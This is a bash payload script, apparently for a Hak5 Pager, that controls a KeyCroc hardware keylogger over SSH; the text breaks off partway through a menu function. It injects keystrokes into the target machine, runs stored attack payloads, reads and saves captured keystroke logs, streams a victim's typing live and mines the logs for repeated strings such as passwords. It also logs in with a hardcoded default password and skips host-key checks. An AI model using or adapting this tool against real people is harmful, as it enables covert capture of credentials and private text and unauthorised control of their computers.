#!/bin/bash

# Title: Pager quack
# Author: spywill
# Description: Send QUACK commands to your KeyCroc, as well as read previously captured keystrokes and monitor live keystrokes as they are entered.
# Version: 2.2

PROMPT "Send QUACK commands to your KeyCroc, read previously captured keystrokes and monitor live keystrokes.
sshpass is required for the connection.
Make sure the Pager and KeyCroc are connected to the same local network.
Alternatively, KeyCroc can connect directly to the Pager's open access point (AP)"

# Payload variables
ENGLISH_WORD_LIST="https://raw.githubusercontent.com/first20hours/google-10000-english/master/google-10000-english.txt"
SAVE_KEYSTROKE="/mmc/root/payloads/user/remote_access/Pager_quack/KeyCroc_Keystrokes"
DUCKY_PAYLOAD="/mmc/root/payloads/user/remote_access/Pager_quack/DuckyPayloads"
PASS_FILE="/mmc/root/payloads/user/remote_access/Pager_quack/croc_passwd.txt"
CROC_IP_FILE="/mmc/root/payloads/user/remote_access/Pager_quack/croc_IP.txt"
WORDFILE="/mmc/root/payloads/user/remote_access/Pager_quack/words.txt"
chmod 777 /mmc/root/payloads/user/remote_access/Pager_quack
REMOTE_FILE="/root/loot/croc_char.log"
i=0

# Create Ducky Payload folder if it does not exist.
if [ ! -d "$DUCKY_PAYLOAD" ] || [ ! -d "$SAVE_KEYSTROKE" ]; then
	mkdir -p "$DUCKY_PAYLOAD"
	mkdir -p "$SAVE_KEYSTROKE"
	LOG yellow "Created Ducky Payloads folder: $DUCKY_PAYLOAD"
	LOG yellow "Created Keystrokes folder: $SAVE_KEYSTROKE"
	# Create default Ducky Payload if it does not exist
	if [ ! -f "$DUCKY_PAYLOAD/QUACK.txt" ]; then
		cat > "$DUCKY_PAYLOAD/QUACK.txt" <<'EOF'
#---> Default Ducky Payload
QUACK STRING "test 1"
QUACK ENTER
QUACK DELAY 2000
QUACK STRING "test 2"
QUACK ENTER
QUACK DELAY 2000
QUACK STRING "working"
QUACK ENTER
EOF
		LOG yellow "Created default Ducky Payload name QUACK.txt"
	fi
fi

# OpenSSH multiplexing reuses one authenticated connection for all ssh_croc calls.
CROC_SSH_CONTROL="/tmp/croc-%r-%h-%p"

# Close the shared SSH connection when the payload exits.
close_croc_ssh() {
	[ -n "$croc_ip" ] || return 0
	ssh -O exit \
		-o ControlPath="$CROC_SSH_CONTROL" \
		-o StrictHostKeyChecking=no \
		root@"$croc_ip" >/dev/null 2>&1
}

# SSH helper: reuse one connection and clear a stale master after transport failure.
ssh_croc() {
	/mmc/usr/bin/sshpass -p "$croc_passwd" ssh \
		-o ControlMaster=auto \
		-o ControlPath="$CROC_SSH_CONTROL" \
		-o ControlPersist=yes \
		-o StrictHostKeyChecking=no \
		-o ConnectTimeout=5 \
		-o ServerAliveInterval=3 \
		-o ServerAliveCountMax=2 \
		root@"$croc_ip" "$@"
	status=$?

	# SSH uses 255 for connection/transport errors. Do not retry a command here:
	# it may already have run on KeyCroc before the connection dropped.
	if [ "$status" -eq 255 ]; then
		ssh -O exit \
			-o ControlPath="$CROC_SSH_CONTROL" \
			-o StrictHostKeyChecking=no \
			root@"$croc_ip" >/dev/null 2>&1
	fi
	return "$status"
}

# Test SSH connectivity to KeyCroc and attempt one reconnection if needed.
test_ssh() {
	# Test the SSH connection by sending a brief LED indicator command.
	if ssh_croc 'sh -lc "LED B ; LED OFF"' 2>/dev/null; then
		LOG green "KEYCROC REACHABLE"
		ssh_test="REACHABLE"
	else
		# Report the connection failure and prepare to retry.
		LOG yellow "[KEYCROC] Connection lost. Trying to reconnect..."
		sleep 1

		# Retry the SSH connection once using the same LED test.
		if ssh_croc 'sh -lc "LED B ; LED OFF"' 2>/dev/null; then
			LOG green "KEYCROC RECONNECTED"
			ssh_test="REACHABLE"
		else
			LOG red "ERROR: KEYCROC UNREACHABLE. Check Wi-Fi, IP and password."
			ERROR_DIALOG "ERROR: KEYCROC UNREACHABLE. Check Wi-Fi, IP and password."
			# Pause before returning and mark the connection as unreachable.
			sleep 10
			ssh_test="UNREACHABLE"
		fi
	fi
}

# Check whether sshpass is installed on the Pager.
if opkg list-installed | grep -q "sshpass"; then
	LOG yellow "Package sshpass is already installed."
else
	# Verify internet connectivity before attempting to download packages.
	LOG yellow "Checking internet connection."
	if ! ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1; then
		ERROR_DIALOG "Internet connection required to install sshpass" ; exit 0
	fi
	LOG green "Online"
	# Ask the user for permission to install sshpass.
	confirm=$(CONFIRMATION_DIALOG "Install sshpass for password-based SSH connections.") || exit 0
	if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then

		# Install sshpass into the MMC package destination.
		spinnerid=$(START_SPINNER "Installing sshpass...")
		opkg update
		opkg -d mmc install sshpass
		STOP_SPINNER ${spinnerid}

		# Verify that sshpass is now listed as an installed package.
		if opkg list-installed | grep -q "sshpass"; then
			LOG green "sshpass has been installed."
		else
			ERROR_DIALOG "ERROR: sshpass not in installed" ; exit 0
		fi
	else
		LOG red "User selected no" ; exit 0
	fi
fi

# Resolve the KeyCroc hostname to an IPv4 address, Extract the IP address from the ping response.
if ip_check=$(ping -4 -c 1 -W 5 croc.lan 2>/dev/null); then
	croc_ip=$(echo "$ip_check" | head -n1 | sed -n 's/.*(\([0-9][0-9.]*\)).*/\1/p')
	LOG yellow "croc.lan is up at $croc_ip"
elif ip_check=$(ping -4 -c 1 -W 5 croc 2>/dev/null); then
	croc_ip=$(echo "$ip_check" | head -n1 | sed -n 's/.*(\([0-9][0-9.]*\)).*/\1/p')
	LOG yellow "croc is up at $croc_ip"
else
	LOG red "croc.lan and croc did not resolve"

	# Check whether a previously saved KeyCroc IP address is available.
	if [ -f "$CROC_IP_FILE" ]; then
		LOG green "[KEYCROC] IP file exists $CROC_IP_FILE"
		ip_check=$(cat "$CROC_IP_FILE")
		# Use the saved address as the default if the file contains a value.
		if [ -n "$ip_check" ]; then
			LOG yellow "Using saved Croc IP: $ip_check"
		else
			LOG red "[KEYCROC] IP file is empty"
			ip_check=""
		fi
	else
		LOG red "[KEYCROC] IP file missing or empty"
		ip_check=""
	fi
	croc_ip=$(IP_PICKER "Enter keycroc IP" "$ip_check") || exit 0
fi

# Save keycroc ip to file.
echo "$croc_ip" > "$CROC_IP_FILE"
LOG yellow "Saved Keycroc IP $croc_ip at $CROC_IP_FILE"

# Checking if key croc is reachability.
can_reach() {
	host="$1"
	ping -4 -c 1 -W 1 "$host" >/dev/null 2>&1 && return 0
	nc -z -w 2 "$host" 22 >/dev/null 2>&1
}

# Check whether KeyCroc is reachable before requesting its password.
if can_reach "$croc_ip"; then
	LOG green "[KEYCROC] $croc_ip reachable"

	# Check whether a saved password file exists.
	if [ -f "$PASS_FILE" ]; then
		LOG yellow "[KEYCROC] Password file exists"
		default_pass=$(cat "$PASS_FILE")
	else
		LOG red "[KEYCROC] Password file missing or empty"
		default_pass="hak5croc"
	fi

	# Prompt the user to enter or edit the KeyCroc password.
	croc_passwd=$(TEXT_PICKER "Enter Key croc password" "$default_pass") || exit 0
	echo "$croc_passwd" > "$PASS_FILE"
	LOG yellow "Saved Keycroc Password at $PASS_FILE"
else
	ERROR_DIALOG "$croc_ip unreachable" ; exit 0
fi

# Keep the shared SSH master alive while the menus are open; close it on exit.
trap 'close_croc_ssh' EXIT

# Send a QUACK command or payload file to KeyCroc over SSH.
Send_Quack() {
	spinnerid=$(START_SPINNER "Exceeding payload...")

	# Connect to KeyCroc and pass the command or payload through Bash stdin.
	if ssh_croc "sh -lc 'bash -s'" <<EOF
$(if [[ -f "$QUACK" ]]; then
	cat "$QUACK"
else
	echo "$QUACK"
fi)
EOF
	then
		# Stop the spinner and report successful delivery.
		STOP_SPINNER "$spinnerid"
		LOG green "Payload has been delivered"
		LOG blue "$QUACK"
		PROMPT "Payload has been delivered
		$QUACK"
	else
		# Stop the spinner and report an SSH or delivery failure.
		STOP_SPINNER "$spinnerid"
		LOG red "Payload delivery failed."
		PROMPT "Payload delivery failed."
		return
	fi
}

# Menu for selecting and sending individual QUACK commands to KeyCroc.
Quack_Command() {
	# Keep displaying the command menu until the user exits or returns.
	while true; do
		# Display the available QUACK commands and keyboard controls.
		resp=$(LIST_PICKER \
			"QUACK COMMAND MENU" \
			"Single_Quack" \
			"Quack_Enter" \
			"Quack_Delete" \
			"Quack_Backspace" \
			"Quack_SpaceBar" \
			"Quack_GUI" \
			"Quack_CTRL-?" \
			"Quack_Numlock" \
			"Quack_ALT-?" \
			"Quack_TAB" \
			"Quack_F_Key" \
			"Quack_Capslock" \
			"Quack_Arrow_Key" \
			"Number_pad" \
			"Exit" \
			"Main_menu" \
			"Main_menu"
		)

		# Run the command associated with the selected menu option.
		case "$resp" in
			"Single_Quack")
				# Prompt the user to enter a custom QUACK command.
				LOG yellow "[KEYCROC] Single Quack command selected. Ready for payload injection..."
				QUACK=$(TEXT_PICKER "Enter Quack command" "QUACK STRING hello world") || return
				Send_Quack
			;;
			"Quack_Enter")
				# Prepare and send the Enter key command.
				LOG yellow "[KEYCROC] Quack Enter command selected. Ready for payload injection..."
				QUACK="QUACK ENTER"
				Send_Quack
			;;
			"Quack_Delete")
				# Prepare and send the Delete key command.
				LOG yellow "[KEYCROC] Quack Delete command selected. Ready for payload injection..."
				QUACK="QUACK DELETE"
				Send_Quack
			;;
			"Quack_Backspace")
				# Prepare and send the Backspace key command.
				LOG yellow "[KEYCROC] Quack Backspace command selected. Ready for payload injection..."
				QUACK="QUACK BACKSPACE"
				Send_Quack
			;;
			"Quack_SpaceBar")
				# Prepare and send the Space key using its HID keycode.
				LOG yellow "[KEYCROC] Quack SpaceBar command selected. Ready for payload injection..."
				QUACK="QUACK KEYCODE 00,00,2c"
				Send_Quack
			;;
			"Quack_GUI")
				# Ask for the key to combine with the GUI modifier.
				LOG yellow "[KEYCROC] Quack GUI command selected. Ready for payload injection..."
				GUI_code=$(TEXT_PICKER "Enter GUI control code" "r") || return
				QUACK="QUACK GUI $GUI_code"
				Send_Quack
			;;
			"Quack_CTRL-?")
				# Ask for the key to combine with the CTRL modifier.
				LOG yellow "[KEYCROC] Quack CTRL-? command selected. Ready for payload injection..."
				CTRL_code=$(TEXT_PICKER "Enter CTRL control code" "c") || return
				QUACK="QUACK CONTROL-$CTRL_code"
				Send_Quack
			;;
			"Quack_Numlock")
				# Prepare and send the Num Lock command.
				LOG yellow "[KEYCROC] Quack Numlock command selected. Ready for payload injection..."
				QUACK="QUACK NUMLOCK"
				Send_Quack
			;;
			"Quack_ALT-?")
				# Ask for the key to combine with the ALT modifier.
				LOG yellow "[KEYCROC] Quack ALT-? command selected. Ready for payload injection..."
				ALT_code=$(TEXT_PICKER "Enter ALT control code" "F4") || return
				QUACK="QUACK ALT-$ALT_code"
				Send_Quack
			;;
			"Quack_TAB")
				# Prepare and send the Tab key command.
				LOG yellow "[KEYCROC] Quack TAB command selected. Ready for payload injection..."
				QUACK="QUACK TAB"
				Send_Quack
			;;
			"Quack_F_Key")
				# Ask for a function-key number and build the corresponding command.
				LOG yellow "[KEYCROC] Quack F-Key command selected. Ready for payload injection..."
				F_KEY=$(NUMBER_PICKER "Enter F-key number" "1") || return
				QUACK="QUACK F$F_KEY"
				Send_Quack
			;;
			"Quack_Capslock")
				# Prepare and send the Caps Lock command.
				LOG yellow "[KEYCROC] Quack Capslock command selected. Ready for payload injection..."
				QUACK="QUACK CAPSLOCK"
				Send_Quack
			;;
			"Quack_Arrow_Key")
				# Enable interactive arrow-key control for the remote device.
				LOG yellow "[KEYCROC] Quack Arrow keys command selected. Ready for payload injection..."
				LOG yellow "[PAGER] Use the arrow keys on the Pager to control arrow-key input on the target device..."
				LOG green "PRESS A BUTTON TO RETURN TO MENU"

				# Wait for Pager input and translate arrow keys into QUACK commands.
				while true; do
					arrow_key=$(WAIT_FOR_INPUT)

					# Send the Arrow command and stop if SSH fails.
					if [ "$arrow_key" = UP ]; then
						if ! ssh_croc 'sh -lc "QUACK UPARROW"'; then
							LOG red "[KEYCROC] Connection lost. Returning to menu."
							return
						fi
						LOG blue "UPARROW"
					elif [ "$arrow_key" = DOWN ]; then
						if ! ssh_croc 'sh -lc "QUACK DOWNARROW"'; then
							LOG red "[KEYCROC] Connection lost. Returning to menu."
							return
						fi
						LOG blue "DOWNARROW"
					elif [ "$arrow_key" = LEFT ]; then
						if ! ssh_croc 'sh -lc "QUACK LEFTARROW"'; then
							LOG red "[KEYCROC] Connection lost. Returning to menu."
							return
						fi
						LOG blue "LEFTARROW"
					elif [ "$arrow_key" = RIGHT ]; then
						if ! ssh_croc 'sh -lc "QUACK RIGHTARROW"'; then
							LOG red "[KEYCROC] Connection lost. Returning to menu."
							return
						fi
						LOG blue "RIGHTARROW"
					elif [ "$arrow_key" = A ]; then
						LOG yellow "Returning to menu."
						return
					else
						LOG yellow "Returning to menu."
						return
					fi
				done
			;;
			"Number_pad")
				# Ask the user to enter a number to send to KeyCroc.
				LOG yellow "[KEYCROC] Number pad. Enter any number..."
				NUMBER=$(NUMBER_PICKER "Number pad" "1") || return
				spinnerid=$(START_SPINNER "Exceeding payload...")
				success=1

				# Process the number one digit at a time.
				for ((i = 0; i < ${#NUMBER}; i++)); do
					digit="${NUMBER:$i:1}"
					QUACK="QUACK $digit"

					# Send the QUACK command to KeyCroc over SSH.
					if ! ssh_croc "sh -lc 'bash -s'" <<EOF
$QUACK
EOF
					then
						success=0
						break
					fi
				done
				STOP_SPINNER "$spinnerid"

				# Report whether all digits were delivered successfully.
				if (( success )); then
					LOG green "Payload has been delivered"
					LOG blue "$NUMBER"
					PROMPT "Payload has been delivered $NUMBER"
				else
					LOG red "Payload delivery failed."
					PROMPT "Payload delivery failed."
				fi
			;;
			"Main_menu")
				LOG yellow "Return to main menu"
				return
			;;
			"Exit")
				confirm=$(CONFIRMATION_DIALOG "Exit. ?") || return
				if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
					exit 0
				fi
			;;
		esac
	done
}

# Run a ducky payload.
Ducky_Payload() {
	LOG blue "================================================="
	LOG yellow "Selected a ducky payload Ensure to give your payload a name"
	LOG cyan "[name_of_payload.txt]"
	LOG yellow "Save payloads at:"
	LOG cyan "[/mmc/root/payloads/user/remote_access/Pager_quack/DuckyPayloads/name_of_payload.txt]"
	LOG blue "================================================="

	# Build the list of .txt files.
	set --
	for file in "$DUCKY_PAYLOAD"/*.txt; do
	[ -f "$file" ] || continue
		set -- "$@" "$(basename "$file")"
	done
	# Check if any files were found.
	if [ "$#" -eq 0 ]; then
		LOG red "No .txt files found in $DUCKY_PAYLOAD"
		PROMPT "No .txt files found in $DUCKY_PAYLOAD"
		return
	fi
	# Build the main payload menu.
	resp=$(LIST_PICKER \
		"DUCKY PAYLOAD MENU" \
		"$@" \
		"View_Payload" \
		"Remove_Payload" \
		"KeyCroc_Payload" \
		"Exit" \
		"Main_menu" \
		"Main_menu"
	)

	case "$resp" in
		"View_Payload")
			LOG cyan "[PAGER] Select a payload to view..."
			view_resp=$(LIST_PICKER \
				"VIEW DUCKY PAYLOAD" \
				"$@" \
				"Cancel" \
				"Cancel"
			) || return

			case "$view_resp" in
				"Cancel"|"")
					LOG yellow "[PAGER] Payload viewing cancelled."
					return
				;;
			esac

			# Verify the selected payload exists.
			if [ ! -f "$DUCKY_PAYLOAD/$view_resp" ]; then
				LOG red "[PAGER] ERROR: Selected payload was not found."
				PROMPT "[PAGER] ERROR: Payload not found."
				return
			fi

			# Display the payload contents.
			LOG green "[PAGER] Viewing payload: $view_resp"
			PROMPT "Payload displayed: $view_resp"
			LOG "$(cat "$DUCKY_PAYLOAD/$view_resp")"
			LOG green "PRESS A BUTTON TO RETURN TO MENU"
			WAIT_FOR_BUTTON_PRESS A
		;;
		"Remove_Payload")
			LOG red "[PAGER] Payload deletion selected."

			# Select the payload to remove.
			remove_resp=$(LIST_PICKER \
				"REMOVE PAYLOAD" \
				"$@" \
				"Cancel" \
				"Cancel"
			) || return

			case "$remove_resp" in
				"Cancel"|"")
					LOG yellow "[PAGER] Payload deletion cancelled."
					return
				;;
			esac

			# Verify the selected file exists.
			if [ ! -f "$DUCKY_PAYLOAD/$remove_resp" ]; then
				LOG red "[PAGER] ERROR: Selected payload was not found."
				PROMPT "[PAGER] ERROR: Payload not found."
				return
			fi

			# Confirm payload deletion.
			confirm=$(CONFIRMATION_DIALOG "[PAGER] Delete payload $remove_resp from the device?") || return
			if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
				if rm "$DUCKY_PAYLOAD/$remove_resp"; then
					LOG green "[PAGER] Payload successfully deleted: $remove_resp"
					PROMPT "[PAGER] Payload successfully deleted: $remove_resp"
				else
					LOG red "[PAGER] ERROR: Failed to delete payload: $remove_resp"
					PROMPT "[PAGER] ERROR: Payload deletion failed: $remove_resp"
				fi
			else
				LOG yellow "[PAGER] Payload deletion cancelled."
			fi
		;;
		"KeyCroc_Payload")
			# Find keycroc selected payload.
			croc_payload="/root/udisk/payloads"
			LOG yellow "[KEYCROC] Select a payload to view/execute..."

			# Retrieve remote payload filenames.
			payload_list=$(ssh_croc "find '$croc_payload' -maxdepth 1 -type f \( -name '*.txt' -o -name '*.sh' \) -exec basename '{}' \;" 2>/dev/null)

			if [ -z "$payload_list" ]; then
				LOG red "[KEYCROC] No KeyCroc payloads files found."
				PROMPT "No KeyCroc payloads files found"
				return
			fi

			# Build payload menu.
			set --
			while IFS= read -r file; do
				[ -n "$file" ] && set -- "$@" "$file"
			done <<EOF
$payload_list
EOF
			resp=$(LIST_PICKER \
				"KEYCROC PAYLOAD MENU" \
				"$@" \
				"View_Payload" \
				"Exit" \
				"Main_menu" \
				"Main_menu"
			) || return

			case "$resp" in
				"View_Payload")
					view_resp=$(LIST_PICKER \
						"VIEW KEYCROC PAYLOAD" \
						"$@" \
						"Cancel" \
						"Cancel"
					) || return

					case "$view_resp" in
						"Cancel"|"") return ;;
					esac

					LOG green "[KEYCROC] Viewing: $view_resp"

					# Display remote file contents.
					content=$(ssh_croc "cat '$croc_payload/$view_resp'" 2>/dev/null) || {
						LOG red "[KEYCROC] Failed to read payload."
						PROMPT "Failed to read payload"
						return
					}

					LOG "$content"
					LOG green "PRESS A BUTTON TO RETURN"
					WAIT_FOR_BUTTON_PRESS A
				;;
				"Main_menu")
					LOG yellow "Returning to main menu."
					return
				;;
				"Exit")
					confirm=$(CONFIRMATION_DIALOG "Exit KeyCroc Payload Menu?") || return
						if [ "$confirm" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
							exit 0
						fi
						return
				;;
				"")
					return
				;;
				*)
					# Verify the remote payload exists.
					if ! ssh_croc "test -f '$croc_payload/$resp'" 2>/dev/null; then
						LOG red "[KEYCROC] Payload not found."
						PROMPT "Payload not found"
						return
					fi

					confirm=$(CONFIRMATION_DIALOG "Run KeyCroc payload: $resp?") || return
					if [ "$confirm" != "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
						LOG yellow "[KEYCROC] Execution cancelled."
						return
					fi

					LOG green "[KEYCROC] Activating payload: $resp"
					LOG cyan "[KEYCROC] Payload contents:"
					LOG "$(ssh_croc "cat '$croc_payload/$resp'")"

					case "$resp" in
						*.sh)
							ssh_croc "sh '$croc_payload/$resp'"
							status=$?
						;;
						*.txt)
							LOG cyan "[KEYCROC] The .txt payload is managed by the KeyCroc framework."
							LOG yellow "[KEYCROC] Its MATCH conditions determine when it executes."
							# Retrieve the payload's MATCH condition from the remote file.
							LOG cyan "[KEYCROC] Reading payload MATCH condition..."
							match_word=$(ssh_croc "grep -i '^[[:space:]]*MATCH' '$croc_payload/$resp'" 2>/dev/null)

							# Continue only if a MATCH condition was found.
							if [ -n "$match_word" ]; then
								LOG blue "========================================"
								LOG yellow "[KEYCROC] PAYLOAD MATCH CONDITION"
								LOG yellow "PAYLOAD: $croc_payload/$resp"
								LOG green "Match word: $match_word"
								LOG blue "========================================"
								# Show the MATCH condition in a prompt.
								PROMPT "[KEYCROC] PAYLOAD MATCH CONDITION
								PAYLOAD: $croc_payload/$resp
								Match word: $match_word"
								# Execute the selected payload on the remote KeyCroc.
								ssh_croc "sh -lc '$croc_payload/$resp'"
								status=$?
							else
								LOG red "[KEYCROC] No MATCH condition found."
							fi
						;;
						*)
							LOG red "[KEYCROC] Unsupported file type."
							return
						;;
					esac

					if [ "$status" -eq 0 ]; then
						LOG green "[KEYCROC] Command completed."
					else
						LOG red "[KEYCROC] Command failed: $status"
					fi
					LOG green "PRESS A BUTTON TO RETURN TO MENU"
					WAIT_FOR_BUTTON_PRESS A
				;;
			esac
		;;
		"Main_menu")
			LOG yellow "Returning to main menu."
			return
		;;
		"Exit")
			confirm=$(CONFIRMATION_DIALOG "Exit. ?") || return
			if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
				exit 0
			fi
		;;
		"")
			return
		;;
		*)
			# Find the selected payload.
			QUACK=""
			for file in "$DUCKY_PAYLOAD"/*.txt; do
				[ -f "$file" ] || continue
				if [ "$(basename "$file")" = "$resp" ]; then
					QUACK="$file"
					break
				fi
			done

			if [ -z "$QUACK" ] || [ ! -f "$QUACK" ]; then
				LOG red "[PAGER] ERROR: Selected payload was not found."
				PROMPT "[PAGER] ERROR: Payload not found."
				return
			fi

			confirm=$(CONFIRMATION_DIALOG "Run Pager payload: $resp?") || return
			if [ "$confirm" != "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
				LOG yellow "[PAGER] Execution cancelled."
				return
			fi

			LOG green "Selected Ducky Payload:"
			LOG "$(cat "$QUACK")"
			Send_Quack
		;;
	esac
}

# Previous/live keystrokes menu.
keystrokes() {

	# Fetch and display the contents of matching remote log files.
	process_logs() {
		log="$1"

		LOG yellow "[KEYCROC] Previous $key selected. Accessing stored data..."
		spinnerid=$(START_SPINNER "Collecting $key...")

		# Display each file's path, character count, separator, and contents.
		OUTPUT=$(
			ssh_croc "find / -type f -name '$log' 2>/dev/null -exec sh -c '
				for file do
					chars=\$(wc -m < \"\$file\")
					echo \"File: \$file\"
					echo \"number of char: \$chars\"
					echo \"------------------------\"
					cat \"\$file\"
					echo
				done
			' sh {} +"
		)

		STOP_SPINNER ${spinnerid}
		sleep 1

		# Display the collected output one line at a time in the Pager UI.
		while IFS= read -r line; do
			LOG "$line"
		done <<< "$OUTPUT"

		LOG green "PRESS A BUTTON TO RETURN TO MENU"
		WAIT_FOR_BUTTON_PRESS A
	}

	# Pattern matching croc_char.log.
	pattern_matching() {
		LOG yellow "Patterns sorted by frequency:"
		spinnerid=$(START_SPINNER "Patterns sorted by frequency")

		# Collect croc_char.log files from KeyCroc.
		content=$(ssh_croc 'find / -type f -name "croc_char.log" -exec cat {} + 2>/dev/null')
		if [[ -z "$content" ]]; then
			STOP_SPINNER ${spinnerid}
			LOG red "No croc_char.log files found"
			return
		fi

		# Count common patterns.
		patterns=$(printf '%s\n' "$content" | \
			grep -oE '[[:alnum:]_]+|[^[:alnum:]_[:space:]]+' | \
			awk '{count[$1]++} END {
				for (pattern in count)
					print count[pattern], pattern
			}' | \
			sort -nr)

		STOP_SPINNER ${spinnerid}
		LOG "$patterns"
		LOG green "PRESS A BUTTON TO CONTINUE"
		WAIT_FOR_BUTTON_PRESS A

		# Find repeated character sequences.
		LOG yellow "Find repeated character sequences:"
		spinnerid=$(START_SPINNER "Repeated character sequences")
		output=$(ssh_croc 'find / -type f -name "croc_char.log" -exec sed '\''s/\[[^]]*\]//g'\'' {} + 2>/dev/null | \
			awk '\''length($0) >= 3 {
				for(i=1; i<=length($0)-2; i++) {
					for(j=i+2; j<=length($0) && j-i+1<=16; j++) {
						print substr($0, i, j-i+1)
					}
				}
			}'\'' | \
			sort | \
			uniq -c | \
			awk '\''$1 > 1 {print $1, $2}'\'' | \
			sort -nr')

		if [[ -n "$output" ]]; then
			STOP_SPINNER ${spinnerid}
			printf '%s\n' "$output" | while IFS= read -r char; do
				LOG "$char"
			done
		else
			STOP_SPINNER ${spinnerid}
			LOG red "No repeated character sequences found."
			PROMPT "No repeated character sequences found."
			return
		fi

		LOG green "PRESS A BUTTON TO RETURN TO MENU"
		WAIT_FOR_BUTTON_PRESS A
	}

	key=$(LIST_PICKER \
	"KEYSTROKE MENU" \
	"Previous_keystrokes" \
	"Live_keystrokes" \
	"Saved_keystrokes" \
	"croc_raw.log" \
	"matches.log" \
	"QUACK.log" \
	"hotplug.log" \
	"attackmode.log" \
	"Pattern_Matching" \
	"Enter_Pattern" \
	"Exit" \
	"Main_menu" \
	"Main_menu"
	)

	case "$key" in
		"Previous_keystrokes")
			process_logs "croc_char.log"
			echo "$OUTPUT" > "$SAVE_KEYSTROKE/KeyCroc_Keystrokes.txt"
			LOG yellow "keystrokes saved to $SAVE_KEYSTROKE"
		;;
		"Live_keystrokes")
			LOG yellow "[KEYCROC] Live keystroke stream selected. Initializing capture..."
			LOG green "PRESS A BUTTON TO STOP LIVE KEYSTROKES"

			spinnerid=$(START_SPINNER "WAITING FOR KEYBOARD ACTIVITY")
			ssh_croc 'sh -lc "WAIT_FOR_KEYBOARD_ACTIVITY 0"'
			STOP_SPINNER "${spinnerid}"

			LOG blue "[KEYCROC] Live keystroke stream starting..."
			# Create a unique temporary FIFO (named pipe) for live keystroke streaming.
			live_fifo="/tmp/live_keys_$$"

			# Create the FIFO or log an error and return if creation fails.
			mkfifo "$live_fifo" || {
				LOG red "[KEYCROC] Failed to create live stream."
				return
			}

			# Start the display loop.
			(
			while IFS= read -r -n1 char; do
				LOG "$char"
			done < "$live_fifo"
			) &
			live_reader_pid=$!

			# Start a dedicated SSH client, reusing the shared master.
			/mmc/usr/bin/sshpass -p "$croc_passwd" ssh \
				-o ControlMaster=auto \
				-o ControlPath="$CROC_SSH_CONTROL" \
				-o ControlPersist=yes \
				-o StrictHostKeyChecking=no \
				-o ConnectTimeout=5 \
				-o ServerAliveInterval=3 \
				-o ServerAliveCountMax=2 \
				root@"$croc_ip" "exec tail -c 10 -f '$REMOTE_FILE'" \
				> "$live_fifo" 2>/dev/null &
			live_ssh_pid=$!

			# Wait for the stop button.
			WAIT_FOR_BUTTON_PRESS A
			LOG red "[KEYCROC] Terminating live keystroke session..."

			# Terminate only this live SSH client, not the shared master.
			kill -9 "$live_ssh_pid" 2>/dev/null

			# Close the display loop and remove the FIFO.
			kill -9 "$live_reader_pid" 2>/dev/null
			wait "$live_ssh_pid" 2>/dev/null
			wait "$live_reader_pid" 2>/dev/null
			rm -f "$live_fifo"

			PROMPT "[KEYCROC] Live keystroke session stopped."
		;;
		"Saved_keystrokes")
			LOG yellow "[PAGER] Accessing saved keystrokes..."
			if [ -f "$SAVE_KEYSTROKE/KeyCroc_Keystrokes.txt" ]; then

				# Confirm whether to strip [[ ]] markers from saved keystrokes.
				confirm=$(CONFIRMATION_DIALOG "Reading captured keystrokes. Strip [[ ]] markers from filtered output...")
					if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
						# Display saved keystrokes with [[ ]] markers removed.
						log_char_count=$(sed 's/\[[^]]*\]//g' "$SAVE_KEYSTROKE/KeyCroc_Keystrokes.txt" | wc -m)
						LOG "Character Count: $log_char_count"
						LOG "$(sed 's/\[[^]]*\]//g' "$SAVE_KEYSTROKE/KeyCroc_Keystrokes.txt")"
					else
						# Display saved keystrokes without filtering.
						while IFS= read -r line; do
							LOG "$line"
						done < "$SAVE_KEYSTROKE/KeyCroc_Keystrokes.txt"
					fi

				LOG blue "$(wc -c < "$SAVE_KEYSTROKE/KeyCroc_Keystrokes.txt") bytes"
				LOG green "PRESS A BUTTON TO RETURN TO MENU"
				WAIT_FOR_BUTTON_PRESS A
			else
				LOG red "[PAGER] No saved keystroke files found in $SAVE_KEYSTROKE."
				PROMPT "[PAGER] No saved keystroke files found in $SAVE_KEYSTROKE."
			fi
		;;
		"croc_raw.log") process_logs "$key" ;;
		"matches.log") process_logs "$key" ;;
		"QUACK.log") process_logs "$key" ;;
		"hotplug.log") process_logs "$key" ;;
		"attackmode.log") process_logs "$key" ;;
		"Pattern_Matching") pattern_matching ;;
		"Enter_Pattern")
			LOG yellow "[KEYCROC] Enter pattern to search in croc_char.log:"
			pattern=$(TEXT_PICKER "Enter pattern to search" "hak5") || return
			content=$(ssh_croc 'find / -type f -name "croc_char.log" -exec cat {} + 2>/dev/null')

			# Count every occurrence of the search pattern, including multiple matches on the same line.
			count=$(printf '%s\n' "$content" | awk -v p="$pattern" '
			{
				while ((pos = index($0, p)) > 0) {
					count++
					$0 = substr($0, pos + length(p))
				}
			}
			END {
				print count + 0
			}')

			# Count output of search pattern.
			if [ "$count" -gt 0 ]; then
				LOG green "[KEYCROC] Match found in loot/croc_char.log."
				LOG yellow "[$pattern] Match count: $count"
				PROMPT "[$pattern] Match count: $count"
			else
				LOG red "Did not find match $pattern in loot/croc_char.log"
				PROMPT "Did not find match $pattern in loot/croc_char.log"
			fi
		;;
		"Main_menu")
			LOG yellow "Return to main menu"
			return
		;;
		"Exit")
			confirm=$(CONFIRMATION_DIALOG "Exit. ?") || return
			if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
				exit 0
			fi
		;;
	esac
}

# Menu for custom KeyCroc commands and keyboard-control functions.
Custom_commands() {
	# Wait for a button press, terminate the active attack, and clean up.
	stop_attack() {
		WAIT_FOR_BUTTON_PRESS ANY
		kill -9 "$attack_pid" 2>/dev/null
		wait "$attack_pid" 2>/dev/null
		LOG green "$1 attack stopped"
		PROMPT "$1 attack stopped"
		unset i
	}

	# Display the available custom commands and keyboard controls.
	custom=$(LIST_PICKER \
		"CUSTOM COMMANDS MENU" \
		"Custom_command" \
		"Lock_keyboard" \
		"Unlock_keyboard" \
		"Hold_key" \
		"Quack_Attack" \
		"Keyboard_Jiggler" \
		"Exit" \
		"Main_menu" \
		"Main_menu"
	)

